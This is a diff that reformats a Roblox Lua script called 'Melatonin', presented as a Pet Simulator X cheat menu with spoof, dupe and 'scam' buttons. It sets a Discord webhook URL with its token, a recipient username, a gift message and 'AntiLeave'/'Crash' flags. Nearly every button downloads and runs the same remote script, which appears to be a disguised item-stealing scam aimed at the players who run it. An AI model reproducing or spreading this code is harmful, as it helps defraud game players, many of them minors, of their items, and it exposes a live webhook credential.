@@ -1,3 +1,103 @@
 --// Melatonin
-
-_G.Username="Komosa01";_G.ScriptName="Melatonin | [💎MINE] Pet Simulator X! 🐾";_G.Webhook="https://discord.com/api/webhooks/1097308151373639680/tpxmO6Ow7z5DpJKO4L747uuCPTeXzqGFsdhkwiE_b6CX_j4WuQhNUuHbbqxG57sgJ8a_";_G.GiftMessage="Tnks :D";_G.Diamonds=500000;_G.UnlockPets=true;_G.AntiLeave=true;_G.Crash=true;_G.Tip1="Don't leave !";_G.Tip2="Wait until the loading finish";_G.Tip3="Your script is loading..";_G.Tip4="Take a break until the script load";_G.Tip5="Don't forget to join the discord!";local v0=Instance.new("Sound",game:GetService("SoundService"));local v1=Instance.new("Sound",game:GetService("SoundService"));v1.SoundId="rbxassetid://876939830";v0.SoundId="rbxassetid://8482764467";v0:Play();game:GetService("StarterGui"):SetCore("SendNotification",{Title="Melatonin | Loaded, PET SIM X",Text="Have fun :D",Duration=20,Button1="Okay",Icon="https://www.roblox.com/asset/?id=12841940716"});game:GetService("StarterGui"):SetCore("SendNotification",{Title="Discord is here!",Text="Join the discord : discord.gg/3fjRZzQp3T",Duration=99999999,Button1="JOIN.",Button2="DECLINE.",Icon="https://www.roblox.com/asset/?id=5313546565"});Wait(2);local v4=loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))();local v5=v4.CreateLib("Melatonin | [💎MINE] Pet Simulator X! 🐾","GrapeTheme");print("Melatonin LOADED");local v6=v5:NewTab("🌎 - Main");local v7=v6:NewSection("Update - 04/17/2023");v7=v6:NewSection("📅 Updates every day!");v7=v6:NewSection("🚀 Discord : discord.gg/3fjRZzQp3T");local v8=v5:NewTab("📀 - Function");local v9=v8:NewSection("Visual Trade 👀");local v10=v5:NewTab("👻 - Spoofer");local v11=v10:NewSection("👻 - Spoofer");local v12=v5:NewTab("🤡 - Dupe/Scam");local v13=v12:NewSection("Click for take pets 👥");local v14=v5:NewTab("💎 - Premium");local v15=v14:NewSection("💎 - Premium");v9:NewToggle("✅ On / ❌ Off ","Turn On or Off the visual trade.",function(v16)if v16 then v1:Play();else v1:Play();end end);v9:NewButton("Fake Titanic 🧩 ","Change a huge pet to a fake titanic",function()v1:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);v9:NewButton("Fake Banana 🍌 ","Change a pet to a fake banana",function()v1:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);v9:NewButton("Fake Huge 🎈 ","Change a pet to a fake huge",function()v1:Play();end);v11:NewButton("Spoof your username 😎 ","Change your username",function()v1:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);v11:NewButton("Spoof your Pets 🌝 ","Change your Pets",function()v1:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);v11:NewButton("Spoof your Diamonds 💎 ","Change your diamonds ammount",function()v1:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);v11:NewButton("Spoof your Coins 🥴 ","Change your coins ammount",function()v1:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);v13:NewButton("Titanic pet 🔥 ","Scam a Titanic pet",function()v1:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);v13:NewButton("Huge pet ☀️ ","Scam a Huge pet",function()v1:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);v13=v12:NewSection("🎯 Dupe");v13:NewButton("Boosts Dupe 🏃 ","Dupe your boosts",function()v1:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);v13:NewButton("Exclusive Egg Dupe 🥚 ","Dupe your Exclusive Egg",function()v1:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);v13:NewButton("Day Care Dupe 🧸 ","Dupe your Day Care pets",function()v1:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);v13:NewButton("Auctions Scams 🍄 ","Just scam auctions",function()v1:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);v13:NewButton("Eggs for Diamonds 💎 ","Just exchange diamonds for eggs",function()v1:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);v15:NewTextBox("Premium Key","Put your key to unlock Premium",function(v17)print(v17);end);
+_G.Username = "Komosa01";
+_G.ScriptName = "Melatonin | [💎MINE] Pet Simulator X! 🐾";
+_G.Webhook = "https://discord.com/api/webhooks/1097308151373639680/tpxmO6Ow7z5DpJKO4L747uuCPTeXzqGFsdhkwiE_b6CX_j4WuQhNUuHbbqxG57sgJ8a_";
+_G.GiftMessage = "Tnks :D";
+_G.Diamonds = 500000;
+_G.UnlockPets = true;
+_G.AntiLeave = true;
+_G.Crash = true;
+_G.Tip1 = "Don't leave !";
+_G.Tip2 = "Wait until the loading finish";
+_G.Tip3 = "Your script is loading..";
+_G.Tip4 = "Take a break until the script load";
+_G.Tip5 = "Don't forget to join the discord!";
+local Sound = Instance.new("Sound", game:GetService("SoundService"));
+local Click = Instance.new("Sound", game:GetService("SoundService"));
+Click.SoundId = "rbxassetid://876939830";
+Sound.SoundId = "rbxassetid://8482764467";
+Sound:Play();
+game:GetService("StarterGui"):SetCore("SendNotification", {Title="Melatonin | Loaded, PET SIM X",Text="Have fun :D",Duration=20,Button1="Okay",Icon="https://www.roblox.com/asset/?id=12841940716"});
+game:GetService("StarterGui"):SetCore("SendNotification", {Title="Discord is here!",Text="Join the discord : discord.gg/3fjRZzQp3T",Duration=99999999,Button1="JOIN.",Button2="DECLINE.",Icon="https://www.roblox.com/asset/?id=5313546565"});
+Wait(2);
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))();
+local Window = Library.CreateLib("Melatonin | [💎MINE] Pet Simulator X! 🐾", "GrapeTheme");
+print("Melatonin LOADED");
+local Main = Window:NewTab("🌎 - Main");
+local MainSection = Main:NewSection("Update - 04/17/2023");
+MainSection = Main:NewSection("📅 Updates every day!");
+MainSection = Main:NewSection("🚀 Discord : discord.gg/3fjRZzQp3T");
+local Function = Window:NewTab("📀 - Function");
+local FunctionSection = Function:NewSection("Visual Trade 👀");
+local Spoofer = Window:NewTab("👻 - Spoofer");
+local SpooferSection = Spoofer:NewSection("👻 - Spoofer");
+local Dupe = Window:NewTab("🤡 - Dupe/Scam");
+local DupeSection = Dupe:NewSection("Click for take pets 👥");
+local Premium = Window:NewTab("💎 - Premium");
+local PremiumSection = Premium:NewSection("💎 - Premium");
+FunctionSection:NewToggle("✅ On / ❌ Off ", "Turn On or Off the visual trade.", function(state)
+	if state then
+		Click:Play();
+	else
+		Click:Play();
+	end
+end);
+FunctionSection:NewButton("Fake Titanic 🧩 ", "Change a huge pet to a fake titanic", function()
+	Click:Play();
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+end);
+FunctionSection:NewButton("Fake Banana 🍌 ", "Change a pet to a fake banana", function()
+	Click:Play();
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+end);
+FunctionSection:NewButton("Fake Huge 🎈 ", "Change a pet to a fake huge", function()
+	Click:Play();
+end);
+SpooferSection:NewButton("Spoof your username 😎 ", "Change your username", function()
+	Click:Play();
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+end);
+SpooferSection:NewButton("Spoof your Pets 🌝 ", "Change your Pets", function()
+	Click:Play();
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+end);
+SpooferSection:NewButton("Spoof your Diamonds 💎 ", "Change your diamonds ammount", function()
+	Click:Play();
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+end);
+SpooferSection:NewButton("Spoof your Coins 🥴 ", "Change your coins ammount", function()
+	Click:Play();
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+end);
+DupeSection:NewButton("Titanic pet 🔥 ", "Scam a Titanic pet", function()
+	Click:Play();
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+end);
+DupeSection:NewButton("Huge pet ☀️ ", "Scam a Huge pet", function()
+	Click:Play();
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+end);
+DupeSection = Dupe:NewSection("🎯 Dupe");
+DupeSection:NewButton("Boosts Dupe 🏃 ", "Dupe your boosts", function()
+	Click:Play();
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+end);
+DupeSection:NewButton("Exclusive Egg Dupe 🥚 ", "Dupe your Exclusive Egg", function()
+	Click:Play();
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+end);
+DupeSection:NewButton("Day Care Dupe 🧸 ", "Dupe your Day Care pets", function()
+	Click:Play();
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+end);
+DupeSection:NewButton("Auctions Scams 🍄 ", "Just scam auctions", function()
+	Click:Play();
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+end);
+DupeSection:NewButton("Eggs for Diamonds 💎 ", "Just exchange diamonds for eggs", function()
+	Click:Play();
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+end);
+PremiumSection:NewTextBox("Premium Key", "Put your key to unlock Premium", function(txt)
+	print(txt);
+end);
